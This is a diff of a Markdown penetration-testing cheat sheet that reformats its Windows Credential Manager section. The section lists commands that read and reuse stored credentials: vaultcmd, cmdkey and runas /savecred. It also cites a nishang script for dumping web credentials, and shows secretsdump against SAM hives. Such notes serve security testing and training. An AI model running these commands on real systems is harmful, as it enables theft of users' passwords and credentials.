@@ -61,17 +61,18 @@ secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
   ```
   
 # 6-Windows Credential Manager:
-```
-vaultcmd /list
-VaultCmd /listproperties:"Web Credentials"
-VaultCmd /listcreds:"Web Credentials"
-VaultCmd /listproperties:"Windows Credentials"
-VaultCmd /listcreds:"Windows Credentials"
-cmdkey /list
-runas /savecred /user:<Domain>\Username cmd.exe
-```
-  - The VaultCmd is not able to show the password. we can use this tools [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)
-    ```
-    Import-Module C:\Tools\Get-WebCredentials.ps1
-    Get-WebCredentials
-    ```
+  - Stored Credentials in system:
+  ```
+  vaultcmd /list
+  VaultCmd /listproperties:"Web Credentials"
+  VaultCmd /listcreds:"Web Credentials"
+  VaultCmd /listproperties:"Windows Credentials"
+  VaultCmd /listcreds:"Windows Credentials"
+  cmdkey /list
+  runas /savecred /user:<Domain>\Username cmd.exe
+  ```
+    - The VaultCmd is not able to show the password. we can use this tools [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)
+      ```
+      Import-Module C:\Tools\Get-WebCredentials.ps1
+      Get-WebCredentials
+      ```
